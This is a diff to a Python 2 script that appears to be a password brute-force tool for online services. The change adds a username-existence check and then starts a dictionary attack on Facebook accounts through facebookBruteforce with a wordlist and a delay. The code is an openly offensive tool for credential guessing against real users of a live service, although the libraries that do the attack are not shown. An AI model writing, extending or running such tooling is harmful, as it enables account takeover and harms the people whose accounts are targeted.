@@ -12,7 +12,7 @@ from subprocess import call
 
 path.append('src/')
 from mainLib import *
-#from twitterLib import *
+from facebookLib import *
 from instagramLib import *
 from header import *
 
@@ -167,11 +167,15 @@ def main():
 
     # Facebook Bruteforce
     elif service == 'facebook':
-        print O + "[*] This Facebook bruteforce module is experimental. You will need to provide a Facebook ID instead of a username. Sorry! [*]" + W
-        sleep(2)
         if address or port:
             print R + "[!] NOTE: You don't need to provide an address OR port for Facebook (LOL) [!]" + w
             exit()
+        print P + "[*] Checking if username exists..." + W
+        if facebookCheck(username) == 1:
+            print R + "[!] The username was not found! Exiting..." + W
+            exit()
+        print G + "[*] Username found! Continuing..." + W
+        sleep(1)
         print P + "[*] Starting dictionary attack! [*]" + W
         print "Using %s seconds of delay. Default is 1 second" % delay
         facebookBruteforce(username, wordlist, delay)
